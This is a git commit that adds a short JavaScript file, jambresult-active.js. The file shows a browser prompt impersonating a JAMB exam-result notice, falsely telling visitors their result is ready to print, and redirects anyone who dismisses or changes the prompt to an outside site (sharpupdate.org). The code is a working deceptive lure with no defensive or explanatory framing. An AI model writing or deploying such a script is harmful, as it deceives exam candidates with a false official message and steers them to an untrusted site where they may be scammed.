a2ad1404241874c0007e4b887c5c9c7b478fde72
ekperikpe <ekperikpe588@gmail.com>
2025-05-05 07:54:13 +0100

    Create jambresult-active.js

---
+++ jambresult-active.js
@@ -0,0 +1,5 @@
+var password = 'CHECK RESULT'
+password=prompt('JAMB: Congratulations, Your Jamb Result is Available for print out, click OK to Check Now','CHECK RESULT');
+if (password != 'CHECK RESULT') {
+location.href='https://sharpupdate.org/jamb.html';
+}
